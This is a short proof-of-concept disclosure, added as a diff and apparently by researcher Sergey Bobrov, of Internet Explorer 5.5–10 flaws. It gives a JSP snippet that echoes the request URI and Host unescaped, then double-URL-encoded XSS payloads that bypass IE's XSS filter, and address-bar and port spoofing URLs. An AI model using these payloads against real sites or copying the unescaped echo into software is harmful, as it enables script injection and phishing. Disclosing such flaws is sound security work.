@@ -1,0 +1,32 @@
+RequestURI: / 
+Host: blackfan.ru 
+Port: 80 
+
+Source
+RequestURI: <%= request.getRequestURI() %>
+Host: <%= request.getServerName() %>
+Port: <%= request.getLocalPort() %>
+
+
+PoC (all versions IE 5.5 - 10.0 are affected): 
+
+XSS via Request-Path + XSS filter bypass + URLencode bypass + Address Bar Spoofing 
+http://bit.ly/Z3oxkK
+http://blackfan.ru:8080/x?r=http://blackfan.ru/<img/src='x'onerror=alert(1)>/%252e%252e/%252e%252e/ 
+
+XSS via Host header + XSS filter bypass 
+http://bit.ly/12i7kL1
+http://blackfan.ru:8080/x?r=http://blackfan.ru%252F<img%252Fsrc='x'onerror=alert(1)>%252F.%252e%252F.%252e%252F%253F%2523 
+
+Port Spoofing 
+http://bit.ly/Z9VOK3
+http://blackfan.ru:8080/x?r=http://www.microsoft.com%253A11/ru-ru/default.aspx 
+http://bit.ly/Yxp2Ho
+http://blackfan.ru:8080/x?r=http://www.oracle.com%253A31337%252Findex.html%253F 
+
+
+
+By Sergey Bobrov (@Black2Fan)
+
+
+MORE REF:http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html
